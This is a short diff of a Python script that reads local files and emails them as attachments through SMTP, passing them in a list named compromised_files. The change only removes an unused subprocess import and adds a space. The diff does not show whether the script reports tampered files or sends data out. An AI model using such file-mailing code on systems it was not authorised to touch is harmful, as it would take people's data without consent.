@@ -5,7 +5,6 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
-import subprocess
 from getpass import getpass
 
 # Insert your email and password to the sender
@@ -51,7 +50,7 @@ def send_email(sender_email, sender_app_password, recipient_email, compromised_f
         # Attach files to the email
         for file_path in compromised_files:
             with open(file_path, 'rb') as file:
-                part = MIMEApplication(file.read(), Name=os.path.basename(file_path))
+                part = MIMEApplication (file.read(), Name=os.path.basename(file_path))
                 part['Content-Disposition'] = f'attachment; filename="{os.path.basename(file_path)}"'
                 msg.attach(part)
 
